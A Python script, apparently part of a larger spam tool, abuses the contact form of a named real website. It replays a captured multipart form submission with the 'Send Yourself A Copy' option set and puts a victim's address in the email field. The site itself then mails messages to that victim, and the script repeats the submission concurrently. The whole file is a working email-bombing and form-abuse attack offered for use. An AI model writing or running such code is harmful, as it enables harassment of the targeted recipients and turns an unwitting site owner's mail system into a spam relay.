from os.path import basename

import requests

from module import Spam

headers = {
    'authority': 'westcoastwintermusic.ca',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryQhG3yWbyc2Bt9txs',
    'origin': 'https://westcoastwintermusic.ca',
    'referer': 'https://westcoastwintermusic.ca/contact/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\nname\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="input_3"\r\n\r\ntest\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="input_4"\r\n\r\ntest\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="input_5.1"\r\n\r\nSend Yourself A Copy\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="is_submit_2"\r\n\r\n1\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n2\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="state_2"\r\n\r\nWyJbXSIsImE5OGFmMGRhYmZlMjM0NTVhOGUxYjQ5OTcyZGM0YTYxIl0=\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="gform_target_page_number_2"\r\n\r\n0\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="gform_source_page_number_2"\r\n\r\n1\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\nd591ba81dcbf042d7c36959da7ddf714\r\n------WebKitFormBoundaryQhG3yWbyc2Bt9txs--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post('https://westcoastwintermusic.ca/contact/', headers=headers, data=data.encode())
        return response


def main():
    s = 'Thanks'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
